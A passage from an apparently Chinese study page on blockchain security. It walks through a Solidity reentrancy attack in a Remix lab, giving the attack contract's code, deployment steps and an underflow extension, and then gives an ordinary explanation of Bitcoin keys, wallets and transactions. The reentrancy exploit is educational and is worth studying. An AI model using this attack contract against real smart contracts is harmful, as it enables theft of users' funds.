class="cm-property">call</span>.<span class="cm-property">value</span>(<span class="cm-variable">amount</span>)(<span class="cm-variable">bytes4</span>(<span class="cm-variable">keccak256</span>(<span class="cm-string">"deposit()"</span>)));</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  }</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  }</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-comment">// withdraw Ether from IDMoney deployed</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">function</span> <span class="cm-def">step2</span>(<span class="cm-def">uint256</span> <span class="cm-variable">amount</span>) <span class="cm-variable">ownerOnly</span> {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">victim</span>.<span class="cm-property">call</span>(<span class="cm-variable">bytes4</span>(<span class="cm-variable">keccak256</span>(<span class="cm-string">"withdraw(address,uint256)"</span>)), <span class="cm-keyword">this</span>, <span class="cm-variable">amount</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  }</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-comment">// selfdestruct, send all balance to owner</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">function</span> <span class="cm-def">stopAttack</span>() <span class="cm-variable">ownerOnly</span> {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">selfdestruct</span>(<span class="cm-variable">owner</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  }</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">function</span> <span class="cm-def">startAttack</span>(<span class="cm-def">uint256</span> <span class="cm-variable">amount</span>) <span class="cm-variable">ownerOnly</span> {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">step1</span>(<span class="cm-variable">amount</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">step2</span>(<span class="cm-variable">amount</span> <span class="cm-operator">/</span> <span class="cm-number">2</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  }</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">function</span> () <span class="cm-variable">payable</span> {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">if</span> (<span class="cm-variable">msg</span>.<span class="cm-property">sender</span> <span class="cm-operator">==</span> <span class="cm-variable">victim</span>) {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-comment">// 再次尝试调用 IDMoney 的 withdraw 函数，递归转币</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">victim</span>.<span class="cm-property">call</span>(<span class="cm-variable">bytes4</span>(<span class="cm-variable">keccak256</span>(<span class="cm-string">"withdraw(address,uint256)"</span>)), <span class="cm-keyword">this</span>, <span class="cm-variable">msg</span>.<span class="cm-property">value</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  }</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  }</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 1549px;"></div><div class="CodeMirror-gutters" style="display: none; height: 1549px;"></div></div></div></pre><h4><a name='header-n486' class='md-header-anchor '></a>攻击原理</h4><blockquote><p>著名导致以太坊硬分叉（ETH/ETC）的 <code>The DAO</code> 事件就跟重入漏洞有关，该事件导致 60 多万以太坊被盗。</p></blockquote><p><img src='pic/blockchain/reentrancy_attack.png' alt='' referrerPolicy='no-referrer' /></p><ol start='' ><li>攻击者部署 <code>Attack</code> 合约</li><li><code>Attack</code> 合约调用 <code>IDMoney</code> 合约的 <code>deposit()</code> 存入接口</li><li><code>Attack</code> 合约调用 <code>IDMoney</code> 合约的 <code>withdarw()</code> 取现接口，取现接口使用 <code>call.value()()</code> 触发 <code>fallback()</code></li><li>在 <code>fallback()</code> 接口中递归调用 <code>withdraw()</code>，从而不断从 <code>IDMoney</code> 合约提现以太坊</li></ol><h4><a name='header-n505' class='md-header-anchor '></a>攻击过程</h4><p>在 <code>https://ethereum.github.io/browser-solidity</code> 或 <code>https://remix.ethereum.org</code> 编译合约</p><p><img src='pic/blockchain/compile_idmoney.png' alt='' referrerPolicy='no-referrer' /></p><p>使用外部账户 <code>0xca35b7d915458ef540ade6068dfe2f44e8fa733</code> 部署 <code>IDMoney</code> 合约</p><p><img src='pic/blockchain/deploy_idmoney.png' alt='' referrerPolicy='no-referrer' /></p><p>得到 <code>IDMoney</code> 合约地址 <code>0x692a70d2e424a56d2c6c27aa97d1a86395877b3a</code></p><p><img src='pic/blockchain/deploy_idmoney2.png' alt='' referrerPolicy='no-referrer' /></p><p>向外部账户 <code>0xca35b7d915458ef540ade6068dfe2f44e8fa733c</code> 向钱包存入 22 个以太坊，如下所示</p><p><img src='pic/blockchain/deposit_idmoney.png' alt='' referrerPolicy='no-referrer' /></p><p>点击 <code>deposit</code> 之后，查看交易信息</p><p><img src='pic/blockchain/deposit_idmoney2.png' alt='' referrerPolicy='no-referrer' /></p><p>通过 <code>balancaeof</code>() 查看外部账户 <code>0xca35b7d915458ef540ade6068dfe2f44e8fa733c</code> 信息，合约中的余额为 22（0 --&gt; 22），同时，账户余额为 77 （99 --&gt; 77）</p><p><img src='pic/blockchain/balanceof_idmoney.png' alt='' referrerPolicy='no-referrer' /></p><p>查看交易信息</p><p><img src='pic/blockchain/balanceof_idmoney2.png' alt='' referrerPolicy='no-referrer' /></p><p>&nbsp;</p><p><strong>WARNING: 切换到外部账户 <code>0x4b0897b0513fdc7c541b6d9d7e929c4e5364d2db</code> 之后，才能部署合约 <code>Attack</code></strong></p><p>部署 <code>Attack</code> 合约</p><p><img src='pic/blockchain/deploy_attack.png' alt='' referrerPolicy='no-referrer' /></p><p>部署合约之后，得到 <code>Attack</code> 合约地址 <code>0x8046085fb6806caa9b19a4cd7b3cd96374dd9573</code>，同时可以查看到外部账户 <code>0x4b0897b0513fdc7c541b6d9d7e929c4e5364d2db</code> 余额变为 97 以太坊</p><p><img src='pic/blockchain/deploy_attack2.png' alt='' referrerPolicy='no-referrer' /></p><p>查看交易信息</p><p><img src='pic/blockchain/deploy_attack3.png' alt='' referrerPolicy='no-referrer' /></p><p>调用 <code>setVictim()</code> 设置合约 <code>IDMoney</code> 地址，如下所示</p><p><img src='pic/blockchain/set_victim_attack.png' alt='' referrerPolicy='no-referrer' /></p><p>查看交易信息</p><p><img src='pic/blockchain/set_victim_attack2.png' alt='' referrerPolicy='no-referrer' /></p><p>外部账户<code>0x4b0897b0513fdc7c541b6d9d7e929c4e5364d2db</code>  尝试发动攻击，调用 <code>Attack</code> 合约中的 <code>startAttack(1000000000000000000)</code>，即，外部账户 <code>0x4b0897b0513fdc7c541b6d9d7e929c4e5364d2db</code> 先向钱包转入 1 个以太坊，然后提取 0.5 个以太坊</p><p><img src='pic/blockchain/start_attack.png' alt='' referrerPolicy='no-referrer' /></p><p>查看交易信息如下</p><blockquote><p><strong>备注：</strong>交易信息部分截图如下，注意查看 <code>logs</code>，包含 46 条事件日志，第 1 条为 <code>Attack</code> 合约打印，剩下的 45 条为 <code>IDMoney</code> 合约打印。</p></blockquote><p><img src='pic/blockchain/start_attack3.png' alt='1533927494535' referrerPolicy='no-referrer' /></p><p>调用 <code>stopAttack()</code> 停止攻击，销毁 <code>Attack</code> 合约，并将合约余额退回到外部账户<code>0x4b0897b0513fdc7c541b6d9d7e929c4e5364d2db</code> </p><p><img src='pic/blockchain/stop_attack.png' alt='' referrerPolicy='no-referrer' /></p><p>查看交易信息</p><p><img src='pic/blockchain/stop_attack2.png' alt='' referrerPolicy='no-referrer' /></p><p>此时，外部账户 <code>0x4b0897b0513fdc7c541b6d9d7e929c4e5364d2db</code>  的余额如下所示</p><blockquote><p><strong>计算思路：</strong><code>97.9 + 2 - 1 + 45 * 0.5 = 121.4</code>，其中，97.9 为部署 <code>Attack</code> 合约之后的余额， 2 为转到 <code>Attack</code> 合约中的以太坊数量（合约销毁即退回原账户），1 为存入 <code>IDMoney</code> 合约的以太坊数量， 45 * 0.5 为递归提现的以太坊数量。</p><p>另外，对于锁定在 <code>IDMoney</code> 中的 0.5 以太坊，可以通过在 <code>IDMoney</code> 预留销毁合约接口，即可实现销毁合约退回到原账户，大致如下：</p><pre spellcheck="false" class="md-fences md-end-block contain-cm modeLoaded" lang="javascript"><div class="CodeMirror cm-s-inner CodeMirror-wrap"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 4px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">// selfdestruct, send all balance to owner</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">function</span> <span class="cm-def">stopAttack</span>() <span class="cm-variable">ownerOnly</span> {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">selfdestruct</span>(<span class="cm-variable">owner</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 100px;"></div><div class="CodeMirror-gutters" style="display: none; height: 100px;"></div></div></div></pre></blockquote><p><img src='pic/blockchain/balanceof_idmoney3.png' alt='' referrerPolicy='no-referrer' /></p><h4><a name='header-n587' class='md-header-anchor '></a>扩展</h4><p>上述攻击合约中提现接口包含 <code>balances[msg.sender] -= amount;</code>，因为存在递归调用，存在数值溢出的问题。</p><p>如果在攻击合约中加入如下事件日志 <code>withdrawLog2()</code> 逻辑</p><pre spellcheck="false" class="md-fences md-end-block contain-cm modeLoaded" lang="javascript" style="break-inside: unset;"><div class="CodeMirror cm-s-inner CodeMirror-wrap"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 4px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">event</span> <span class="cm-variable">withdrawLog</span>(<span class="cm-variable">address</span>, <span class="cm-variable">uint256</span>);</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">event</span> <span class="cm-variable">withdrawLog2</span>(<span class="cm-variable">address</span>, <span class="cm-variable">uint256</span>, <span class="cm-variable">uint256</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">function</span> <span class="cm-def">IDMoney</span>() { <span class="cm-variable">owner</span> <span class="cm-operator">=</span> <span class="cm-variable">msg</span>.<span class="cm-property">sender</span>; }</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">function</span> <span class="cm-def">deposit</span>() <span class="cm-variable">payable</span> { <span class="cm-variable">balances</span>[<span class="cm-variable">msg</span>.<span class="cm-property">sender</span>] <span class="cm-operator">+=</span> <span class="cm-variable">msg</span>.<span class="cm-property">value</span>; }</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">function</span> <span class="cm-def">withdraw</span>(<span class="cm-def">address</span> <span class="cm-variable">to</span>, <span class="cm-variable">uint256</span> <span class="cm-variable">amount</span>) {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">require</span>(<span class="cm-variable">balances</span>[<span class="cm-variable">msg</span>.<span class="cm-property">sender</span>] <span class="cm-operator">&gt;</span> <span class="cm-variable">amount</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">require</span>(<span class="cm-keyword">this</span>.<span class="cm-property">balance</span> <span class="cm-operator">&gt;</span> <span class="cm-variable">amount</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">withdrawLog</span>(<span class="cm-variable">to</span>, <span class="cm-variable">amount</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">to</span>.<span class="cm-property">call</span>.<span class="cm-property">value</span>(<span class="cm-variable">amount</span>)();</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">balances</span>[<span class="cm-variable">msg</span>.<span class="cm-property">sender</span>] <span class="cm-operator">-=</span> <span class="cm-variable">amount</span>;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">withdrawLog2</span>(<span class="cm-variable">msg</span>.<span class="cm-property">sender</span>, <span class="cm-variable">amount</span>, <span class="cm-variable">balances</span>[<span class="cm-variable">msg</span>.<span class="cm-property">sender</span>]);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 376px;"></div><div class="CodeMirror-gutters" style="display: none; height: 376px;"></div></div></div></pre><p>在执行完攻击之后，可以在日志记录中查看到如下信息，从第 3 次开始，数值已经溢出，如下所示：</p><p><img src='pic/blockchain/attack_log.png' alt='' referrerPolicy='no-referrer' /></p><h2><a name='header-n597' class='md-header-anchor '></a>比特币 bitcoin</h2><h3><a name='header-n598' class='md-header-anchor '></a>密钥和地址</h3><p>一个比特币钱包中包含一系列的密钥对，每个密钥对包括一个私钥和一个公钥。私钥（k）是一个数字，通常是随机选出的。有了私钥，我们就可以使用椭圆曲线乘法这个单向加密函数产生一个公钥（K）。有了公钥（K），我们就可以使 用一个单向加密哈希函数生成比特币地址（A）。在本节中，我们将从生成私钥开始，讲述如何使用椭圆曲线运算将私 钥生成公钥，并最终由公钥生成比特币地址。</p><h4><a name='header-n601' class='md-header-anchor '></a>钱包地址的生成</h4><p><img src='pic/bitcoin/wallet_address.jpg' alt='img' referrerPolicy='no-referrer' /></p><ol start='' ><li>首先使用随机数发生器生成一个『私钥』。一般来说这是一个256 bits 的数，拥有了这串数字就可以对相应『钱包地址』中的比特币进行操作，所以必须被安全地保存起来。</li><li>『私钥』经过 SECP256K1 算法处理生成了『公钥』。SECP256K1 是一种椭圆曲线算法，通过一个已知『私钥』时可以算得『公钥』，而『公钥』已知时却无法反向计算出『私钥』。这是保障比特币安全的算法基础</li><li>同 SHA256 一样，RIPEMD160 也是一种 Hash 算法，由『公钥』可以计算得到『公钥哈希』，而反过来是行不通的。</li><li>将一个字节的地址版本号连接到『公钥哈希』头部（对于比特币网络的 pubkey 地址，这一字节为“0”），然后对其进行两次 SHA256 运算，将结果的前 4 字节作为『公钥哈希』的校验值，连接在其尾部。</li><li>将上一步结果使用 BASE58 进行编码（比特币定制版本），就得到了『钱包地址』。</li></ol><h4><a name='header-n620' class='md-header-anchor '></a>私钥、公钥、钱包地址</h4><p><img src='pic/bitcoin/private_public_address.jpg' alt='img' referrerPolicy='no-referrer' /></p><p>通过『私钥』可以得到上述计算过程中所有的值。 『公钥哈希』和『钱包地址』可以通过互逆运算进行转换，所以它们是等价的。</p><h4><a name='header-n625' class='md-header-anchor '></a>使用『私钥』对交易进行签名</h4><p><img src='pic/bitcoin/transaction.jpg' alt='img' referrerPolicy='no-referrer' /></p><p>比特币钱包间的转账是通过交易（Transaction）实现的。交易数据是由转出钱包『私钥』的所有者生成，也就是说有了『私钥』就可以花费该钱包的比特币余额。生成交易的过程如下：</p><ol start='' ><li>交易的原始数据包括“转账数额”和“转入钱包地址”，但是仅有这些是不够的，因为无法证明交易的生成者对“转出钱包地址”余额有动用的权利。所以需要用『私钥』对原始数据进行签名。</li><li>生成“转出钱包公钥”，这一过程与生成『钱包地址』的第 2 步是一样的。</li><li>将“转出签名”和“转出公钥”添加到原始交易数据中，生成了正式的交易数据，这样它就可以被广播到比特币网络进行转账了。</li></ol><h4><a name='header-n640' class='md-header-anchor '></a>使用『公钥』对签名进行验证</h4><p><img src='pic/bitcoin/verify.jpg' alt='img' referrerPolicy='no-referrer' /></p><p>交易数据被广播到比特币网络后，节点会对这个交易数据进行检验，其中就包括对签名的校验。如果校验正确，那么这笔余额就成功地从“转出钱包”转移到“转入钱包”了。</p><h4><a name='header-n645' class='md-header-anchor '></a>结论</h4><blockquote><p>本文仅讨论标准 P2PKH（对公钥哈希的付款 ） 交易方式，P2SH 不在讨论范围内。</p></blockquote><p>如果一个『钱包地址』从未曾发送余额到其他『钱包地址』，那么它的『公钥』是不会暴露在比特币网络上的。而公钥生成算法（SECP256K1）是不可逆的，即使『公钥』暴露，也很难对『私钥』的安全性造成影响（难易取决于『私钥』的生成算法）。</p><p>『私钥』用来生成『公钥』和『钱包地址』，也用来对交易进行签名。拥有了『私钥』就是拥有了对这个钱包余额的一切操作权力。</p><p>所以，保护『私钥』是所有比特币钱包应用最基本也是最重要的功能。</p><h3><a name='header-n655' class='md-header-anchor '></a>钱包</h3><p>“钱包”一词在比特币中有多重含义。 广义上，钱包是一个应用程序，为用户提供交互界面。 钱包控制用户访问权限，管理密钥和地址，跟踪余额以及创建和签名交易。 狭义上，即从程序员的角度来看，“钱包”是指用于存储和管理用户密钥的数据结构。</p><h4><a name='header-n658' class='md-header-anchor '></a>非确定性钱包</h4><p><strong>非确定性钱包（nondeterministic wallet）</strong>，其中每个密钥都是从随机数独立生成的。密钥彼此无关。这种钱包也被称为“Just a Bunch Of Keys（一堆密钥）”，简称 JBOK 钱包</p><h4><a name='header-n661' class='md-header-anchor '></a>确定性钱包</h4><p><strong>确定性钱包（deterministic wallet）</strong>，其中所有的密钥都是从一个主密钥派生出来，这个主密钥即为种子（seed）。该类型钱包中所有密钥都相互关联，如果有原始种子，则可以再次生成全部密钥。确定性钱包中使用了许多不同的密钥推导方法。最常用的推导方法是使用树状结构，称为分级确定性钱包或 HD 钱包。</p><h3><a name='header-n664' class='md-header-anchor '></a>交易</h3><blockquote><p>比特币交易是比特币系统中最重要的部分。根据比特币系统的设计原理，系统中任何其他的部分都是为了确保比特币交易可以被生成、能在比特币网络中得以传播和通过验证，并最终添加入全球比特币交易总账簿（比特币区块链）。比特币交易的本质是数据结构，这些数据结构中含有比特币交易参与者价值转移的相关信息。比特币区块链是一本全球复式记账总账簿，每个比特币交易都是在比特币区块链上的一个公开记录。</p></blockquote><p>通过 Bitcoin Core 解码的一笔标准的交易信息如下：</p><pre spellcheck="false" class="md-fences md-end-block contain-cm modeLoaded" lang="json" style="break-inside: unset;"><div class="CodeMirror cm-s-inner CodeMirror-wrap"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 4px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">{</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-string cm-property">"version"</span>: <span class="cm-number">1</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-string cm-property">"locktime"</span>: <span class="cm-number">0</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-string cm-property">"vin"</span>: [</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-string cm-property">"txid"</span>:<span class="cm-string">"7957a35fe64f80d234d76d83a2a8f1a0d8149a41d81de548f0a65a8a999f6f18"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-string cm-property">"vout"</span>: <span class="cm-number">0</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-string cm-property">"scriptSig"</span>: <span class="cm-string">"3045022100884d142d86652a3f47ba4746ec719bbfbd040a570b1deccbb6498c75c4ae24cb02204b9f039ff08df09cbe9f6addac960298cad530a863ea8f53982c09db8f6e3813[ALL] 0484ecc0d46f1918b30928fa0e4ed99f16a0fb4fde0735e7ade8416ab9fe423cc5412336376789d172787ec3457eee41c04f4938de5cc17b4a10fa336a8d752adf"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-string cm-property">"sequence"</span>: <span class="cm-number">4294967295</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  }</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> ],</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-string cm-property">"vout"</span>: [</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-string cm-property">"value"</span>: <span class="cm-number">0.01500000</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-string cm-property">"scriptPubKey"</span>: <span class="cm-string">"OP_DUP OP_HASH160 ab68025513c3dbd2f7b92a94e0581f5d50f654e7 OP_EQUALVERIFY OP_CHECKSIG"</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  },</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-string cm-property">"value"</span>: <span class="cm-number">0.08450000</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-string cm-property">"scriptPubKey"</span>: <span class="cm-string">"OP_DUP OP_HASH160 7f9b1a7fb68d60c536c2fd8aeaa53a8f3cc025a8 OP_EQUALVERIFY OP_CHECKSIG"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  }</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  ]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 652px;"></div><div class="CodeMirror-gutters" style="display: none; height: 652px;"></div></div></div></pre><h4><a name='header-n671' class='md-header-anchor '></a>交易的输入输出</h4><p>比特币交易中的基础构建单元是交易输出。 交易输出是比特币不可分割的基本组合，记录在区块上，并被整个网络识别为有效。 比特币完整节点跟踪所有可找到的和可使用的输出，称为 “未花费的交易输出”（unspent transaction outputs），即 UTXO。 所有 UTXO 的集合被称为 UTXO 集，目前有数百万个 UTXO。 当新的 UTXO被创建，UTXO 集就会变大，当 UTXO 被消耗时，UTXO 集会随着缩小。每一个交易都代表 UTXO 集的变化（状态转换） 。</p><p>一笔交易会消耗先前的已被记录（存在）的 UTXO，并创建新的 UTXO 以备未来的交易消耗。通过这种方式，一定数量的比特币价值在不同所有者之间转移，并在交易链中消耗和创建 UTXO。一笔比特币交易通过使用所有者的签名来解锁 UTXO，并通过使用新的所有者的比特币地址来锁定并创建 UTXO。</p><p>从交易的输出与输入链角度来看，有一个例外，即存在一种被称为“创币交易”（Coinbase Transaction）的特殊交易，它是每个区块中的第一笔交易，这种交易存在的原因是作为对挖矿的奖励，创造出全新的可花费比特币用来支付给“赢家”矿工。</p><h4><a name='header-n678' class='md-header-anchor '></a>交易输出</h4><p>每一笔比特币交易都会创造输出，并被比特币账簿记录下来。除特例之外（见“数据输出操作符”（OP_RETURN）），几乎所有的输出都能创造一定数量的可用于支付的比特币，也就是 UTXO。这些 UTXO 被整个网络识别，所有者可在未来的交易中使用它们。</p><p>UTXO 在 UTXO 